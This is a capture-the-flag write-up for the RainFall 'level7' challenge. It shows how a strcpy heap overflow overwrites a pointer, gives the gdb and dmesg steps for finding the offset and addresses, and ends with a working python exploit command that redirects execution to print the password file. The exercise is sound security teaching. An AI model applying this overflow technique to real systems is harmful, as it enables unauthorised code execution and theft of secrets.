### Brief
The program contain a `main`, and a `m` function.
The `main` function takes two argument and have 2 two-dimensional array allocated on the heap and 1 heap buffer.
Our first argument is copied at index 1 of the first 2d array.
Our second argument is copied at index 1 of the second 2d array.
The `m` function that print the time and what is contained by the variabl `c`.

### Exploit
Here we can overflow both buffer as `strcpy` is used on both buffer.
So we overflow the first buffer so that it can overwrite the addresses contained in the second 2d array.
Since the second 2d array contains the address where our second input will be copied, we can copy our second argument anywhere.

We use the pattern generator to get the offset needed to overwrite the address where our second argument will be copied.
```bash
level7@RainFall:~$ ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" test
level7@RainFall:~$ dmesg
...
[12284.472714] level7[10638]: segfault at 37614136 ip b7eb1922 sp bffff6cc error 6 in libc-2.15.so[b7e2c000+1a3000]
```
The offset is `20`

Then we need to get the address of the `m` function so that we overwrite the return address with it.
We do that because the content of the `.pass` file is copied into the `c` variable which is printed by the `m` function.

```bash
level7@RainFall:~$ gdb level7
(gdb) info functions
...
0x080484f4  m
...
```
The address of `m` is `0x080484f4`

We also need the address that contain the return address of the main function which is `%ebp + 4`.

```bash
level7@RainFall:~$ gdb level7
(gdb) break main
Breakpoint 1 at 0x8048524
(gdb) run
Starting program: /home/user/level7/level7 

Breakpoint 1, 0x08048524 in main ()
(gdb) print $ebp + 4
$2 = (void *) 0xbffff73c
```

The address is `0xbffff73c`

### Get access
We overwrite the address where the second parameter will be copied to with the address of the return address.
And we put the address of `m` inside.
```bash
./level7 `python -c "print('A'*20 + '\x3c\xf7\xff\xbf')"` `python -c "print('\xf4\x84\x04\x08')"`
```